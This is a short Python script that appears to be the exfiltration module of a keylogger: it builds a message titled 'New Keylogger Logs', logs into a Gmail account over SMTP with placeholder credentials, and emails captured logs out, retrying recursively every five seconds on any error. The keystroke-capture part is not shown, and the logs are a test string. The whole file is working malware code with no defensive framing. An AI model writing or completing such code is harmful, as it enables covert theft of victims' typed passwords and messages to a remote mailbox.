import smtplib
import time

strEmailAc = "email@gmail.com"
strEmailPass = "pass"

def SendMessages(strLogs, strEmailAc, strEmailPass):
    try:
        strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
        strMessage = strDateTime + "\n\n" + strLogs

        strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)


        SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        SmtpServer.ehlo()   # identifies you to the smtp server
        SmtpServer.login(strEmailAc, strEmailPass)
        SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
    except:
        time.sleep(5)   # freeze program for 5 seconds to try again
        SendMessages(strLogs, strEmailAc, strEmailPass)


strLogs = "aaaaaa"
SendMessages(strLogs, strEmailAc, strEmailPass)
